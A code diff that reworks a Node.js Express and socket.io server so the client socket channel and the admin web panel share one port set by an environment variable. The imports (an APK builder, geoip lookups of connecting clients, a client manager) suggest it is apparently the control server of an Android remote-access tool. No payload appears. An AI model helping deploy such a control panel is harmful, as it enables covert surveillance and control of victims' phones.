@@ -8,12 +8,13 @@
 const
     express = require('express'),
     app = express(),
-    IO = require('socket.io'),
+    server = require('http').createServer(app),
+    IO = require('socket.io')(server),
     geoip = require('geoip-lite'),
     CONST = require('./includes/const'),
     db = require('./includes/databaseGateway'),
     logManager = require('./includes/logManager'),
-    clientManager = new (require('./includes/clientManager'))(db),
+    clientManager = new(require('./includes/clientManager'))(db),
     apkBuilder = require('./includes/apkBuilder');
 
 global.CONST = CONST;
@@ -24,10 +25,11 @@ global.clientManager = clientManager;
 global.apkBuilder = apkBuilder;
 
 // spin up socket server
-let client_io = IO.listen(CONST.control_port);
+// let client_io = IO.listen(CONST.control_port);
 
-client_io.sockets.pingInterval = 30000;
-client_io.on('connection', (socket) => {
+// client_io.sockets.pingInterval = 30000;
+IO.sockets.pingInterval = 30000;
+IO.on('connection', (socket) => {
     socket.emit('welcome');
     let clientParams = socket.handshake.query;
     let clientAddress = socket.request.connection;
@@ -48,14 +50,14 @@ client_io.on('connection', (socket) => {
 
     if (CONST.debug) {
         var onevent = socket.onevent;
-        socket.onevent = function (packet) {
+        socket.onevent = function(packet) {
             var args = packet.data || [];
-            onevent.call(this, packet);    // original call
+            onevent.call(this, packet); // original call
             packet.data = ["*"].concat(args);
-            onevent.call(this, packet);      // additional call to catch-all
+            onevent.call(this, packet); // additional call to catch-all
         };
 
-        socket.on("*", function (event, data) {
+        socket.on("*", function(event, data) {
             console.log(event);
             console.log(data);
         });
@@ -65,7 +67,8 @@ client_io.on('connection', (socket) => {
 
 
 // get the admin interface online
-app.listen(CONST.web_port);
+// app.listen(CONST.web_port);
+server.listen(process.env.PORT || CONST.web_port)
 
 app.set('view engine', 'ejs');
 app.set('views', './assets/views');
